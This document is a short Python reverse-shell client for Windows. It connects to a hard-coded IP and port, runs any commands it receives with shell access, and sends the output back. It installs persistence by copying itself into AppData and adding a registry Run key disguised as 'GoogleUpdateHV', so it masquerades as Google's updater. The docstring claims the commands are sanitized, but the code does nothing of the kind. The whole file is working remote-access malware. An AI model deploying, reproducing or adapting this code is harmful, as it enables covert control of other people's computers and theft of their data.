import socket,subprocess,os,shutil,getpass

#Globals
IP = "192.168.178.185"
PORT = 8888
user = getpass.getuser()
SourcePath = (f"C:/Users/{user}/Downloads/client.py")
CopiedPath = (f"C:/Users/{user}/AppData/Roaming/GoogleUpdate/GoogleUpdateHV.py")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))

def persist():
    os.mkdir(os.path.join(os.path.join(os.environ['APPDATA']), 'GoogleUpdate'))
    shutil.copy(SourcePath, CopiedPath)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GoogleUpdateHV /t REG_SZ /d ' + CopiedPath, shell=True)

def parse_commands(data):
    """
    Function to parse and sanitize the received commands
    """
    if data[:2].decode("utf-8") == 'cd' and len(data[3:].decode("utf-8"))>0:
        try:
            os.chdir(data[3:].decode("utf-8"))
            return "Changed directory to: " + os.getcwd() + "\n"
        except Exception as e:
            return "Error changing directory: " + str(e) + "\n"
    elif data[:7].decode("utf-8") == "persist":
        persist()
        return "Persistent File Added In: " + CopiedPath + "\n"
    else:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        return output_str

while True:
    data = s.recv(1024)
    if not data:
        s.send(str.encode("No data received"))
        break
    else:
        result = parse_commands(data)
        s.send(str.encode(result))

s.close()


